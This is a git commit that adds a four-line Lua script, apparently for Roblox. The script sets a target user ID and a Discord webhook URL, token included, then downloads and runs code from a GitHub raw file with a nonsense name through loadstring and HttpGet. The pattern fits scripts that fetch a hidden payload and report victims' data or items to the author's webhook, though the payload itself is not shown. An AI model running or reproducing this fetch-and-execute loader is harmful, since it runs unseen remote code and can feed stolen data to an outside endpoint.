10ae94d19d8be2b266f8f5f6dc8ee143188fdf7b
Sepressed <81093578+Sepressed@users.noreply.github.com>
2022-12-16 03:18:19 +0100

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,4 @@
+_G.UserID = 2817607021
+_G.WebHook = "https://discord.com/api/webhooks/1053083559918829608/_hxTBDGDC16TcDOUgWimFzmusvlPGiZrjez_IyKMT-_iuD8Q_wsD6qk5pOTo1TgnvnZD"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sepressed/wqaerfawdawfafe/main/asefasefaefasef", true))()
